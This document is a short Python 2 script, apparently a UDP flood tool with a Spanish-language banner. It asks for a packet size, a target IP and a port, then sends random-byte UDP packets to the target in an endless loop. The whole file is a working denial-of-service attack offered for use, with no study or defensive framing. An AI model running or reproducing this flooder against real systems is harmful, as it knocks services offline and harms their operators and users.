import sys
import os
import random
import socket
from sys import platform



"""
Created By: l-YoนOff𝓵ineﾂ-l
==========================
%%%%%%%%%%%%%%%%%%%%%%%%%%%

"""



if platform == "linux" or platform == "linux2":
    os.system("clear")
elif platform == "darwin":
    os.system("clear")
    print "This Script Works Best on Kali linux"
elif platform == "win32":
    os.system("cls")
else:
    print "\033[1;34m [-]Unknown System Detected \033[1;m"

print "\033[1;32m"

connect = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
print """
 _     __   __          _____  __  __ _ _                   _ 
| |    \ \ / /         |  _  |/ _|/ _| (_)                 | |
| |_____\ V /___  _   _| | | | |_| |_| |_ _ __   ___ ______| |
| |______\ // _ \| | | | | | |  _|  _| | | '_ \ / _ \______| |
| |      | | (_) | |_| \ \_/ / | | | | | | | | |  __/      | |
|_|      \_/\___/ \__,_|\___/|_| |_| |_|_|_| |_|\___|      |_|
                                                              
  
=======================================
     Created By: l-YoนOff𝓵ineﾂ-l
=======================================
PONER 300 BYTES
=======================================
"""



try:
    size = input("bytes> ")
    attack = random._urandom(size)
    ip = raw_input("IP> ")
    port = input("port> ")
    print " "
    print "ATAQUE LANZADO"
    print " "
except SyntaxError:
    print " "
    exit("\033[1;34m ERROR \033[1;m")
except NameError:
    print " "
    exit("\033[1;34m Invalid Input \033[1;m")
except KeyboardInterrupt:
    print " "
    exit("\033[1;34m [-]Canceled By User \033[1;m")
except ImportError:
    print " "
    exit("\033[1;34m [-]Install python 2.7.15")


while True:
    try:
        connect.sendto(attack, (ip, port))
        print "Attacking sending bytes ===>"
    except KeyboardInterrupt:
        print " "
        exit("\033[1;34m [-]Canceled By User \033[1;m")
    except ImportError:
        print " "
        exit("\033[1;34m [-]Install python 2.7.15")
